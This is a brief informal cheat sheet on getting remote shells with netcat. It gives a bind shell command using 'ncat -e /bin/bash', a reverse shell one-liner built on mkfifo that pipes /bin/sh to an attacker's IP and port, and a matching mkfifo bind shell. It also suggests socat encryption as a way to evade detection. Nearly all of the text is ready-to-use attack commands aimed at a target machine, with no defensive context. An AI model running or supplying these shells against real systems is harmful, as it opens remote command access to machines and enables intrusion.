First On The Target Machine Get it to listen on a specific port using:

ncat -lvnp 1234 -e /bin/bash

// -e /bin/bash specifies to use the bash shell

next connect to target using:

ncat TARGET_IP PORT

mostly this method will not work if used like this without any evasion techniques.

to use evasion techniques use socat to encrypt communication.

Most versions of netcat or nc doesn't come with -e option to execute /bin/bash shell for example so in this case we use this for a reverse shell on the target: 

mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f 


and this on the target for a bind shell: mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
